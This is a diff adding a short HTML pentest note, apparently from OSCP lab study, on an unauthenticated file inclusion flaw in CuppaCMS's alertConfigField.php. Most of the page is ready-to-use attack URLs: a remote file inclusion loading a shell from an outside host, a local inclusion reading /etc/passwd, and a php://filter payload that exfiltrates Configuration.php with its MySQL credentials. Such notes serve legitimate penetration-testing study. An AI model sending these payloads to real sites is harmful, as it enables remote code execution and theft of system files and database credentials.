@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>CuppaCMS</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># CuppaCMS</h1></strong><br /><a href="https://www.cuppacms.com/">https://www.cuppacms.com/</a><br /><a href="https://github.com/CuppaCMS/CuppaCMS">https://github.com/CuppaCMS/CuppaCMS</a><br /><br />&quot;Cuppa a powerful, adaptive content manager for all projects.&quot;<br /><br /><strong>Examples</strong><br />• OSCP 10.11.1.116 - Dotty<br /><br /><strong><h2>## Exploits</h2></strong><br /><strong><h3>### &#39;/alertConfigField.php&#39; Local/Remote File Inclusion </h3></strong><br /><a href="https://www.exploit-db.com/exploits/25971">https://www.exploit-db.com/exploits/25971</a><br /><br />You don&#39;t need to have credentials for this exploit.<br /><br /><strong>Examples</strong><br />• OSCP 10.11.1.116 - Dotty<br /><br />RFI<br /><code>http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?<br /><br /></code>LFI<code><br />http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</code><br /><br />You can use LFI to retrieve the CuppaCMS <code>Configuration.php</code> file, which containsMySQL creds.<br /><code>http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php</code></div>
+</body>
+</html>
